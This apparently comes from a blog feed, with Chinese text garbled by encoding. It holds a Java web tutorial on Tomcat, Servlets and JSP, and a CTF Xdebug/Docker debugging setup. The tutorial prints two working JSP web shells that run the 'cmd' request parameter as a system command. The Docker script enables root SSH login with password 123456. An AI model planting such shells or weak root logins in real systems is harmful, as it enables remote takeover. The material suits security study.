    <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><h2 id="Tomcatï¼‹Servlet"><a href="#Tomcatï¼‹Servlet" class="headerlink" title="Tomcatï¼‹Servlet"></a>Tomcatï¼‹Servlet</h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ä¸åŒjavaç‰ˆæœ¬å¯¹åº”çš„tomcatå’Œservletä¸å¤ªä¸€æ ·, è¿™é‡Œæ­é…å¦‚ä¸‹:</p><p>java 1.8</p><p>Servlet 3.1.0</p><p>Tomcat 8</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Tomcat-Servlet_Demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ›å»ºwaråŒ…ç›®å½•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428235641031.png" alt="image-20240428235641031"></p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å…¶ä»–ç»†èŠ‚å‚è€ƒ"><a href="#å…¶ä»–ç»†èŠ‚å‚è€ƒ" class="headerlink" title="å…¶ä»–ç»†èŠ‚å‚è€ƒ"></a>å…¶ä»–ç»†èŠ‚å‚è€ƒ</h3><p><a href="https://www.jianshu.com/p/b4b42a90b2e9">https://www.jianshu.com/p/b4b42a90b2e9</a></p><p><a href="https://blog.csdn.net/qq_52057693/article/details/124260380">https://blog.csdn.net/qq_52057693/article/details/124260380</a></p><h3 id="ç¼–å†™ä»£ç "><a href="#ç¼–å†™ä»£ç " class="headerlink" title="ç¼–å†™ä»£ç "></a>ç¼–å†™ä»£ç </h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello ä½ å¥½&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œåè®¿é—®</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429000025817.png" alt="image-20240429000025817"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><blockquote><p>JSPï¼ˆJava Server Pagesï¼‰ï¼Œæ˜¯Javaçš„ä¸€ç§åŠ¨æ€ç½‘é¡µæŠ€æœ¯ã€‚åœ¨æ—©æœŸJavaçš„å¼€å‘æŠ€æœ¯ä¸­ï¼ŒJavaç¨‹åºå‘˜å¦‚æœæƒ³è¦å‘æµè§ˆå™¨è¾“å‡ºä¸€äº›æ•°æ®ï¼Œå°±å¿…é¡»å¾—æ‰‹åŠ¨<code>println</code>ä¸€è¡Œè¡Œçš„HTMLä»£ç ã€‚ä¸ºäº†è§£å†³è¿™ä¸€ç¹ççš„é—®é¢˜ï¼ŒJavaå¼€å‘äº†JSPæŠ€æœ¯ã€‚</p><p>JSPå¯ä»¥çœ‹ä½œä¸€ä¸ªJava Servletï¼Œä¸»è¦ç”¨äºå®ç°Java webåº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆHTMLä»£ç ã€XHTMLä»£ç ã€XMLå…ƒç´ ä»¥åŠåµŒå…¥JSPæ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™JSPã€‚</p><p>å½“ç¬¬ä¸€æ¬¡è®¿é—®JSPé¡µé¢æ—¶ï¼ŒTomcatæœåŠ¡å™¨ä¼šå°†JSPé¡µé¢ç¿»è¯‘æˆä¸€ä¸ªjavaæ–‡ä»¶ï¼Œå¹¶å°†å…¶ç¼–è¯‘ä¸º.classæ–‡ä»¶ã€‚JSPé€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚</p></blockquote><p>ç›´æ¥åœ¨webappæ–‡ä»¶å¤¹ä¸‹åˆ›å»ºjspæ–‡ä»¶å³å¯</p><p>è„šæœ¬ç¨‹åºçš„è¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% ä»£ç ç‰‡æ®µ %&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥ç¼–å†™ä¸å…¶ç­‰ä»·çš„XMLè¯­å¥ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   ä»£ç ç‰‡æ®µ</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>ä»»ä½•æ–‡æœ¬ã€HTMLæ ‡ç­¾ã€JSPå…ƒç´ å¿…é¡»å†™åœ¨è„šæœ¬ç¨‹åºçš„å¤–é¢ã€‚</p><h3 id="JSPå£°æ˜"><a href="#JSPå£°æ˜" class="headerlink" title="JSPå£°æ˜"></a>JSPå£°æ˜</h3><p>ä¸€ä¸ªå£°æ˜è¯­å¥å¯ä»¥å£°æ˜ä¸€ä¸ªæˆ–å¤šä¸ªå˜é‡ã€æ–¹æ³•ï¼Œä¾›åé¢çš„Javaä»£ç ä½¿ç”¨ã€‚åœ¨JSPæ–‡ä»¶ä¸­ï¼Œæ‚¨å¿…é¡»å…ˆå£°æ˜è¿™äº›å˜é‡å’Œæ–¹æ³•ç„¶åæ‰èƒ½ä½¿ç”¨å®ƒä»¬ã€‚</p><p>JSPå£°æ˜çš„è¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declaration; [ declaration; ]+ ... %&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥ç¼–å†™ä¸å…¶ç­‰ä»·çš„XMLè¯­å¥ï¼Œå°±åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   ä»£ç ç‰‡æ®µ</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure><p>ç¨‹åºç¤ºä¾‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! int i = 0; %&gt; </span><br><span class="line">&lt;%! int a, b, c; %&gt; </span><br><span class="line">&lt;%! Circle a = new Circle(2.0); %&gt; </span><br></pre></td></tr></table></figure><hr><h3 id="JSPè¡¨è¾¾å¼"><a href="#JSPè¡¨è¾¾å¼" class="headerlink" title="JSPè¡¨è¾¾å¼"></a>JSPè¡¨è¾¾å¼</h3><p>ä¸€ä¸ªJSPè¡¨è¾¾å¼ä¸­åŒ…å«çš„è„šæœ¬è¯­è¨€è¡¨è¾¾å¼ï¼Œå…ˆè¢«è½¬åŒ–æˆStringï¼Œç„¶åæ’å…¥åˆ°è¡¨è¾¾å¼å‡ºç°çš„åœ°æ–¹ã€‚</p><p>ç”±äºè¡¨è¾¾å¼çš„å€¼ä¼šè¢«è½¬åŒ–æˆStringï¼Œæ‰€ä»¥æ‚¨å¯ä»¥åœ¨ä¸€ä¸ªæ–‡æœ¬è¡Œä¸­ä½¿ç”¨è¡¨è¾¾å¼è€Œä¸ç”¨å»ç®¡å®ƒæ˜¯å¦æ˜¯HTMLæ ‡ç­¾ã€‚</p><p>è¡¨è¾¾å¼å…ƒç´ ä¸­å¯ä»¥åŒ…å«ä»»ä½•ç¬¦åˆJavaè¯­è¨€è§„èŒƒçš„è¡¨è¾¾å¼ï¼Œä½†æ˜¯ä¸èƒ½ä½¿ç”¨åˆ†å·æ¥ç»“æŸè¡¨è¾¾å¼ã€‚</p><p>JSPè¡¨è¾¾å¼çš„è¯­æ³•æ ¼å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= è¡¨è¾¾å¼ %&gt;</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œæ‚¨ä¹Ÿå¯ä»¥ç¼–å†™ä¸ä¹‹ç­‰ä»·çš„XMLè¯­å¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   è¡¨è¾¾å¼</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure><h2 id="Javaæœ¨é©¬"><a href="#Javaæœ¨é©¬" class="headerlink" title="Javaæœ¨é©¬"></a>Javaæœ¨é©¬</h2><h3 id="JSPæœ¨é©¬"><a href="#JSPæœ¨é©¬" class="headerlink" title="JSPæœ¨é©¬"></a>JSPæœ¨é©¬</h3><p>ä¼ ç»Ÿæ— å›æ˜¾æœ¨é©¬</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429191039735.png" alt="image-20240429191039735"></p><p>æœ‰å›æ˜¾æœ¨é©¬:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šçš„æœ¨é©¬ç‰¹å¾å¼º,å®¹æ˜“è¯†åˆ«, ä¸”éœ€è¦æ–‡ä»¶è½åœ°, ç”±æ­¤,å¼•å‡ºéšè”½æ€§å¼º,æ— éœ€æ–‡ä»¶çš„å†…å­˜é©¬</p><h3 id="Tomcatå†…å­˜é©¬"><a href="#Tomcatå†…å­˜é©¬" class="headerlink" title="Tomcatå†…å­˜é©¬"></a>Tomcatå†…å­˜é©¬</h3><p>åé¢éœ€è¦è°ƒè¯•Tomcat, é‡æ–°å¼„ä¸ªç¯å¢ƒ,å‚è€ƒ:</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><p>åœ¨æ­¤ä¹‹å‰, éœ€è¦å…ˆäº†è§£Tomcatæ¶æ„</p><p>è†œæ‹œå¤§ä½¬åšå®¢</p><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><h4 id="Tomcatä¸‰å¤§ç»„ä»¶"><a href="#Tomcatä¸‰å¤§ç»„ä»¶" class="headerlink" title="Tomcatä¸‰å¤§ç»„ä»¶"></a>Tomcatä¸‰å¤§ç»„ä»¶</h4><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p>ä¸‰å¤§ç»„ä»¶çš„åŠ è½½é¡ºåºä¸º<code>**Listener-&gt;Filter-&gt;Servlet**</code>ã€‚</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><blockquote><p>åœ¨Tomcatä¸­ï¼ŒContextæ˜¯Containerç»„ä»¶çš„ä¸€ç§å­å®¹å™¨ï¼Œå…¶å¯¹åº”çš„æ˜¯ä¸€ä¸ªWebåº”ç”¨ã€‚Contextä¸­å¯ä»¥åŒ…å«å¤šä¸ªWrapperå®¹å™¨ï¼Œè€ŒWrapperå¯¹åº”çš„æ˜¯ä¸€ä¸ªå…·ä½“çš„Servletå®šä¹‰ã€‚å› æ­¤Contextå¯ä»¥ç”¨æ¥ä¿å­˜ä¸€ä¸ªWebåº”ç”¨ä¸­å¤šä¸ªServletçš„ä¸Šä¸‹æ–‡ä¿¡æ¯ã€‚</p></blockquote><h4 id="Tomcatä¸­çš„ä¸‰ç§Context"><a href="#Tomcatä¸­çš„ä¸‰ç§Context" class="headerlink" title="Tomcatä¸­çš„ä¸‰ç§Context"></a>Tomcatä¸­çš„ä¸‰ç§Context</h4><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><blockquote><p>ServletContextæ¥å£çš„å®ç°ç±»ä¸ºApplicationContextç±»å’ŒApplicationContextFacadeç±»ï¼Œå…¶ä¸­ApplicationContextFacadeæ˜¯å¯¹ApplicationContextç±»çš„åŒ…è£…ã€‚æˆ‘ä»¬å¯¹Contextå®¹å™¨ä¸­å„ç§èµ„æºè¿›è¡Œæ“ä½œæ—¶ï¼Œæœ€ç»ˆè°ƒç”¨çš„è¿˜æ˜¯StandardContextä¸­çš„æ–¹æ³•ï¼Œå› æ­¤StandardContextæ˜¯Tomcatä¸­è´Ÿè´£ä¸åº•å±‚äº¤äº’çš„Contextã€‚</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-Web&quot;&gt;&lt;a href=&quot;#Java-Web&quot; class=&quot;headerlink&quot; title=&quot;Java Web&quot;&gt;&lt;/a&gt;Java Web&lt;/h1&gt;&lt;h2 id=&quot;Tomcatï¼‹Servlet&quot;&gt;&lt;a href=&quot;#Tomcatï¼‹Servlet&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>PHP storm + Xdebug è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®</title>
    <link href="http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/"/>
    <id>http://example.com/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/</id>
    <published>2024-03-27T14:02:29.000Z</published>
    <updated>2024-03-27T16:32:26.062Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-storm-Xdebug-è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®-sshéš§é“"><a href="#PHP-storm-Xdebug-è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®-sshéš§é“" class="headerlink" title="PHP storm + Xdebug è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®(sshéš§é“)"></a>PHP storm + Xdebug è¿œç¨‹è°ƒè¯•dockeré¡¹ç›®(sshéš§é“)</h1><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><h2 id="å‰ç½®å‡†å¤‡"><a href="#å‰ç½®å‡†å¤‡" class="headerlink" title="å‰ç½®å‡†å¤‡"></a>å‰ç½®å‡†å¤‡</h2><ol><li>dockerç¯å¢ƒ</li><li>ä½ éœ€è¦è°ƒè¯•çš„é¡¹ç›®</li></ol><p>è¿™é‡Œéœ€è¦è°ƒè¯•çš„é¡¹ç›®ä»¥ä¸Šæ¬¡åœ¨åšNKCTFçš„ä¸€é“é¢˜ç›®ä¸ºä¾‹</p><p>é¢˜ç›®åŸ Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬éœ€è¦å¯¹dockerfileè¿›è¡Œä¿®æ”¹ä»¥ä½¿ç”¨äºè°ƒè¯•</p><ol><li>å®‰è£…sshæœåŠ¡ã€‚ PHPSTORMéœ€è¦ ssh æ¥è¿›è¡Œç›®å½•æ˜ å°„ï¼Œä¸ç„¶æ— æ³•æˆåŠŸ Debug</li><li>å®‰è£… xdebugã€‚è¿™æ˜¯è°ƒè¯•çš„åŸºç¡€æ‰©å±•ç»„ä»¶</li><li>è®¾ç½® ssh å…è®¸ root ç™»é™†ã€‚æ¯•ç«Ÿåªæ˜¯ä¸ª docker è°ƒè¯•ç¯å¢ƒï¼Œå°±ä¸å¼„é‚£ä¹ˆéº»çƒ¦äº†ã€‚å½“ç„¶å¦‚æœæ˜¯çº¿ä¸Šä¸šåŠ¡å•¥çš„å½“ç„¶è¦åšå¥½æƒé™åˆ†é…ã€‚</li><li>ä¿®æ”¹ rootå¯†ç ã€‚æ¯•ç«Ÿä¸çŸ¥é“å¯†ç ä¹Ÿæ— æ³•è¿æ¥</li><li>å¯åŠ¨ ssh æœåŠ¡</li><li>é‡å¯ apache æœåŠ¡</li></ol><p>å¯ä»¥çœ‹è§è¿™é‡Œæ‹‰å–äº†php8.0, è¿™é‡Œæˆ‘ä»¬éœ€è¦ä¸‹è½½å®‰è£…å¯¹åº”ç‰ˆæœ¬çš„xdebug, è¿™éå¸¸å…³é”®!!!</p><p>é™„ä¸€ä¸ªå„phpç‰ˆæœ¬å¯¹åº”çš„xdebugç‰ˆæœ¬, å…¶ä»–ç‰ˆæœ¬å¦è¡Œæœç´¢</p><table><thead><tr><th>phpç‰ˆæœ¬</th><th>xdebugç‰ˆæœ¬</th></tr></thead><tbody><tr><td>php7.0</td><td>xdebug 2.8.1</td></tr><tr><td>php7.1</td><td>xdebug 2.9.8</td></tr><tr><td>php7.2</td><td>xdebug 3.1.5</td></tr><tr><td>php7.3</td><td>xdebug 3.1.5</td></tr><tr><td>php7.4</td><td>xdebug 3.1.5</td></tr><tr><td>php8.0</td><td>xdebug 3.1.5</td></tr><tr><td>php8.1</td><td>xdebug 3.1.5</td></tr></tbody></table><p>å› æ­¤æˆ‘ä»¬éœ€è¦çš„æ˜¯xdebug 3.1.5</p><p>å»è¿™ä¸ªç½‘ç«™æŸ¥çœ‹xdebug(ä¸éœ€è¦ä¸‹è½½ä¸‹æ¥)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327221042712.png" alt="image-20240327221042712"></p><p>å¯ä»¥çœ‹è§å¯¹åº”æœ‰xdebug 3.1.5æŒ‰ç…§è¿™ä¸ªæ–‡ä»¶å, æ·»åŠ ä¸€ä¸ªdockerfileè¯­å¥</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    docker-php-ext-enable xdebug</span></span><br></pre></td></tr></table></figure><p>åœ¨Dockerfileçš„åŒçº§ç›®å½•æ–°å»ºä¸€ä¸ªstart.shæ–‡ä»¶, ç”¨äºå®Œæˆæ­¥éª¤3,4,5</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#è®¾ç½® ssh å…è®¸ root ç™»å½•</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#ä¿®æ”¹rootå¯†ç </span></span><br><span class="line"><span class="built_in">echo</span> root:123456 | chpasswd</span><br><span class="line"><span class="comment">#é…ç½® Xdebugã€‚Xdebug 3 çš„é…ç½®å¦‚ä¸‹ï¼Œå’Œ Xdebug 